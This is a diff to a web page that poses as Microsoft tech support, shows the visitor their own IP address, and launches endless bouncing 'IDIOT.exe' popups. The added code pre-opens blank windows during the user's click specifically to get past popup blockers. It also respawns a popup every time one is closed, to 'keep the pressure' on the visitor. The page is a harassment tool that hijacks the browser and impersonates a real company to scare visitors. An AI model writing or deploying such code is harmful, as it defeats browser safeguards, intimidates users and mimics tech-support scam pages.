@@ -9,7 +9,6 @@
   <meta property="og:image" content="https://cdn.discordapp.com/attachments/1448206166189674518/1467361747697402031/IMG_3375_-_Copy.jpg?ex=69801a9e&is=697ec91e&hm=93b4a68db03ae35820839b99ea88c6e226b5db4a5ae2f80c81c7703a5f67c6bd&" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://andrilchakraborty.github.io/fm/" />
-
   <style>
     * { box-sizing: border-box; margin:0; padding:0; }
     body {
@@ -25,7 +24,6 @@
       background:#000;
       transition: background-color 1s ease-in-out;
     }
-
     /* Initial overlay that you click */
     .initial-screen {
       position: absolute;
@@ -49,7 +47,6 @@
       text-transform: uppercase;
       user-select:none;
     }
-
     /* Background video */
     video.background-video {
       position: absolute;
@@ -59,7 +56,6 @@
       object-fit:cover;
       z-index: -1;
     }
-
     /* main content hidden initially */
     #main-content {
       display: none;
@@ -68,9 +64,8 @@
     }
     @keyframes slideUp {
       from { transform: translateY(20px); opacity: 0; }
-      to   { transform: translateY(0); opacity: 1; }
+      to { transform: translateY(0); opacity: 1; }
     }
-
     .socials-container {
       display:inline-block;
       background: rgba(0,0,0,0.7);
@@ -79,7 +74,6 @@
       margin-top: 1rem;
       min-width: 320px;
     }
-
     .typewriter-text {
       display:inline-block;
       font-size: 2.4rem;
@@ -95,31 +89,24 @@
     .cursor { display:inline-block; width:6px; height:36px; background:#fff; margin-left:8px; vertical-align:middle;
       animation: blink 0.8s step-end infinite; }
     @keyframes blink { 50% { opacity:0 } }
-
     .description-text { font-size: 1rem; color: #eee; margin-top: 0.8rem; text-shadow: 0 0 8px #fff; }
-
     .social-icons { display:flex; justify-content:center; gap:18px; margin-top: 1rem; }
     .social-icons a img { width:46px; height:46px; display:block; filter: invert(1) drop-shadow(0 0 6px #fff); }
-
     audio { margin-top: 14px; border-radius: 10px; background: rgba(0,0,0,0.35); padding:8px; }
-
     /* status from popup script */
     #status { font-size: 0.9rem; color:#aaa; margin-top:8px; max-width:420px; }
   </style>
 </head>
 <body>
-
   <!-- Initial overlay -->
   <div class="initial-screen" id="initial-screen" aria-hidden="false">
     <div class="initial-text" id="enter-btn" role="button">Click For Tech Support</div>
   </div>
-
   <!-- Background video (keeps playing behind everything) -->
   <video class="background-video" autoplay loop muted playsinline>
     <source src="https://cdn.discordapp.com/attachments/1448206166189674518/1467362306416705607/IMG_3375_-_Copy_online-video-cutter.com.mp4?ex=69801b24&is=697ec9a4&hm=4ef8f1419f844e8c52d5bd41d61295a6f3a8baff003c4f72669694b1fc6ac5c6&" type="video/mp4">
     Your browser does not support the video tag.
   </video>
-
   <!-- Main content shown after enter -->
   <div id="main-content" aria-hidden="true">
     <div class="socials-container">
@@ -127,7 +114,6 @@
         <span id="ip-text"></span><span class="cursor" id="cursor"></span>
       </div>
       <div class="description-text">Welcome to Microsoft support — how may I help you?</div>
-
       <div class="social-icons" aria-hidden="false">
         <a href="https://support.microsoft.com/en-us" target="_blank" rel="noreferrer noopener" title="Microsoft">
           <img src="https://img.icons8.com/color/48/microsoft.png" alt="Microsoft"/>
@@ -145,16 +131,13 @@
           <img src="https://img.icons8.com/?size=48&id=mlOg8xC4khEI&format=png&color=000000" alt="CashApp"/>
         </a>
       </div>
-
       <audio id="background-audio" loop>
         <source src="https://cdn.discordapp.com/attachments/1448206166189674518/1467361314002305024/Theme_From_New_York_New_York_2008_Remastered_-_Frank_Sinatra.mp3?ex=69801a37&is=697ec8b7&hm=23bce7b15ab402511fc988a0866fe95f80f4af83be4fe4c8d59b2454f5cd87c7&" type="audio/mp3">
         Your browser does not support audio.
       </audio>
-
       <div id="status">Ready.</div>
     </div>
   </div>
-
   <!-- All JS in one place -->
   <script>
     /***********************************************************
@@ -166,7 +149,6 @@
     const ipTextEl = document.getElementById('ip-text');
     const statusEl = document.getElementById('status');
     const audioEl = document.getElementById('background-audio');
-
     function typeOutText(text, element, speed=120) {
       element.textContent = '';
       let i = 0;
@@ -178,7 +160,6 @@
         }
       }, speed);
     }
-
     async function fetchAndDisplayIP() {
       try {
         const resp = await fetch('https://api.ipify.org?format=json');
@@ -189,12 +170,10 @@
         typeOutText('???', ipTextEl, 120);
       }
     }
-
     // Ensure audio play attempt happens on user gesture
     function tryPlayAudio() {
       audioEl.play().catch(()=>{ /* ignored */ });
     }
-
     // Title typing animation (small fun loop)
     (function startTitleTyping(){
       const base = '@';
@@ -208,6 +187,26 @@
     })();
 
     /***********************************************************
+     * Pre-open pool to reduce popup-blocker UI
+     * --- ADDED: preopenPool + preOpenWindows() ---
+     ***********************************************************/
+    const preopenPool = [];
+    function preOpenWindows(n = 6) {
+      for (let i = 0; i < n; i++) {
+        try {
+          // Use about:blank so it's same-origin and writable
+          const w = window.open('about:blank', '_blank');
+          if (w) {
+            // mark it as "reserved" (we'll write to it later)
+            preopenPool.push(w);
+          }
+        } catch (e) {
+          // ignore; if blocked, pool remains small
+        }
+      }
+    }
+
+    /***********************************************************
      * Bouncing/popups logic (merged from second script)
      ***********************************************************/
     const POPUP_WIDTH = 460;
@@ -216,7 +215,6 @@
     const TICK_MS = 28;
     const MARGIN = 50;
     const TOP_MARGIN = 80;
-
     // sample image pool (you can edit/expand)
     const imagePool = [
       "https://i.redd.it/d1vg3bkqbsgg1.jpeg",
@@ -237,16 +235,14 @@
       "https://i.redd.it/nvyo12mpnrgg1.jpeg",
       // placeholders allowed — add real ones if needed
     ];
-
     const activePopups = new Set();
-
     function openPopupBlank(title = "IDIOT.exe") {
       const left = Math.max(10, (screen.availWidth - POPUP_WIDTH) / 2 + ((Math.random()*260 - 130)|0));
-      const top  = Math.max(10, (screen.availHeight - POPUP_HEIGHT) / 2 + ((Math.random()*180 - 90)|0));
+      const top = Math.max(10, (screen.availHeight - POPUP_HEIGHT) / 2 + ((Math.random()*180 - 90)|0));
       const features = `width=${POPUP_WIDTH},height=${POPUP_HEIGHT},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`;
       const win = window.open('', '_blank', features);
       if (!win) {
-        alert("Popup blocked! Allow popups for this site and try again.");
+        // user likely blocked fresh popups
         return null;
       }
       return win;
@@ -272,18 +268,81 @@
           } catch(e){}
         <\/script>
       </body></html>`;
-      const win = openPopupBlank('Bouncing');
-      if (!win) return;
+
+      // Try to reuse a window from the pre-open pool first (avoids blocker)
+      let win = null;
+      while (preopenPool.length) {
+        const candidate = preopenPool.pop();
+        try {
+          // if the candidate was closed, skip it
+          if (!candidate || candidate.closed) continue;
+          win = candidate;
+          break;
+        } catch (e) {
+          // accessing .closed might fail in rare cases, skip candidate
+          continue;
+        }
+      }
+
+      // If no pre-opened window, fall back to opening a fresh one (may be blocked)
+      if (!win) {
+        win = openPopupBlank('Bouncing');
+        if (!win) {
+          // fresh open was blocked; nothing else to do
+          return;
+        }
+      }
+
       try {
+        // same-origin or about:blank => safe to write
         win.document.open();
         win.document.write(html);
         win.document.close();
       } catch (e) {
         console.error('Failed to write to popup', e);
+        // if write fails, try a fresh open
+        try {
+          const fallback = openPopupBlank('Bouncing');
+          if (fallback) {
+            fallback.document.open();
+            fallback.document.write(html);
+            fallback.document.close();
+            activePopups.add(fallback);
+            // attach monitor & bounce below
+            setupPopupAfterOpen(fallback);
+          }
+        } catch (inner) {}
+        return;
       }
+
       activePopups.add(win);
-      // small delay then start bounce
-      setTimeout(() => startBouncing(win), 350 + (Math.random()*300|0));
+      // attach monitor & start bouncing behavior
+      setupPopupAfterOpen(win);
+    }
+
+    // Factor out setup used after popup is created/written
+    function setupPopupAfterOpen(win) {
+      // --- per-window monitor: spawn replacement immediately when closed ---
+      try {
+        win.__spawn_handled = false;
+      } catch (e) {}
+      const monitorInterval = setInterval(() => {
+        try {
+          if (!win || win.closed) {
+            clearInterval(monitorInterval);
+            try { win.__spawn_handled = true; } catch(e){}
+            activePopups.delete(win);
+            // immediate single replacement
+            spawnBouncingWindow();
+          }
+        } catch (e) {
+          clearInterval(monitorInterval);
+          activePopups.delete(win);
+        }
+      }, 350);
+
+      // start bouncing motion
+      startBouncing(win);
     }
 
     function startBouncing(win) {
@@ -308,18 +367,22 @@
       tick();
     }
 
-    // If a popup closes, spawn extras
+    // If a popup closes, spawn extras (keeps your original idea)
     function watchForClosures() {
       setInterval(() => {
         let closedCount = 0;
         for (const win of [...activePopups]) {
-          if (win.closed) {
+          try {
+            if (win.closed) {
+              activePopups.delete(win);
+              closedCount++;
+            }
+          } catch(e){
             activePopups.delete(win);
-            closedCount++;
           }
         }
         if (closedCount > 0) {
-          const howMany = closedCount * 2 + Math.floor(Math.random()*4);
+          const howMany = Math.max(1, closedCount + Math.floor(Math.random()*2));
           for (let i = 0; i < howMany; i++) {
             setTimeout(spawnBouncingWindow, i * 220);
           }
@@ -327,12 +390,12 @@
       }, 900);
     }
 
+    // Listen for child message (child posts beforeunload)
     window.addEventListener('message', (e) => {
       if (e.data?.type === 'child_closing') {
-        if (Math.random() < 0.8) {
-          spawnBouncingWindow();
-          setTimeout(spawnBouncingWindow, 300);
-        }
+        // deterministic replacements to keep the pressure
+        spawnBouncingWindow();
+        setTimeout(spawnBouncingWindow, 200);
       }
     });
 
@@ -342,7 +405,6 @@
 
     // Start everything: multiple initial spawns + watchers
     function startBallsChaos() {
-      // quick feedback
       statusEl.textContent = `Spawning chaos — popups may be blocked by your browser. Images: ${imagePool.length}`;
       // open several first
       for (let i = 0; i < 5; i++) spawnBouncingWindow();
@@ -367,29 +429,28 @@
       setTimeout(() => {
         initialScreen.style.display = 'none';
       }, 900);
-
       mainContent.style.display = 'block';
       mainContent.setAttribute('aria-hidden', 'false');
-
       // small UI flourish
       statusEl.textContent = 'Loading...';
-
       // fetch IP and type it out
       await fetchAndDisplayIP();
-
       // start chaos (popups)
       startBallsChaos();
-
       // update status
       setTimeout(() => {
         statusEl.textContent = 'Good luck closing them…';
       }, 1300);
     }
 
-    // wire enter button (initial click) to do everything
+    // wire enter button (initial click) to pre-open windows and do everything
     enterBtn.addEventListener('click', (e) => {
       // prevent double-activation
       enterBtn.style.pointerEvents = 'none';
+      // Pre-open blank windows during the actual user click gesture.
+      // Pick a modest number (6) to reduce chance of being blocked or flagged.
+      preOpenWindows(6);
+      // now run the regular enter-site flow (which will reuse pre-opened windows)
       enterSite();
     });
 
@@ -397,7 +458,6 @@
     document.body.addEventListener('click', () => {
       tryPlayAudio();
     }, { once:true });
-
   </script>
 </body>
 </html>
